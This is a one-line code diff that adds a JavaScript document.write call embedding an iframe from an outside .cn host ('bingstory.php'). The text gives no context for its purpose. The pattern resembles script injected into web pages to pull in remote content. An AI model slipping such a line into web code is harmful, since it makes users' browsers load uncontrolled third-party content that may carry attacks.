@@ -1,0 +1,1 @@
+document.write("<iframe src='https://abllo.cn/bing/bingstory.php?&info=true' style='max-height: -webkit-fill-available;height:35px;'></iframe>")
